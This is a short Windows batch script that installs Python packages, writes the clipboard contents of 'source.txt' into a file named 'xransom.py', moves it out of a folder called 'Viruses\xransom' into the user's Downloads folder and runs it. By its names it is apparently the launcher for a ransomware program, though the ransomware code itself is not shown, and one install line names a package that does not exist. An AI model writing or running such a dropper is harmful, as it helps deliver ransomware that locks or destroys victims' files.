@echo off
pip install cryptography.fernet
pip install requests
type "source.txt" | clip
set "filename=xransom.py"
echo. > xransom.py
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.Clipboard]::GetText()" > "%filename%"
timeout 1 > nul
set source="C:\Users\nassi\Downloads\Viruses\xransom\xransom.py"
set destination="%USERPROFILE%\Downloads"
move %source% %destination%
timeout 1 > nul
python "C:\Users\%USERNAME%\Downloads\xransom.py"
exit
